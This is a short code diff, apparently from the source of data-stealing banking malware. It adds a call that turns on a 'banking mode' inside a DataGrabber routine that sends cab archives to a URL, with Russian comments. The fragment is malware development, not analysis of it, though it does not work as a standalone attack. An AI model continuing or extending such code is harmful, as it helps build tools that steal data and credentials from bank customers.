@@ -1921,6 +1921,11 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 	if (!FileExistsA(CabFileName))
 		return false;
 
+
+    // При любой отправке каба включаем режим Банк
+    SetBankingMode();
+
+
 	// Уведомляем монитор об отправке каба
 	MONITOR_DELIMETED_MSG(BMCONST(MessageSendCab), AppName, ":", CabFileName);
 
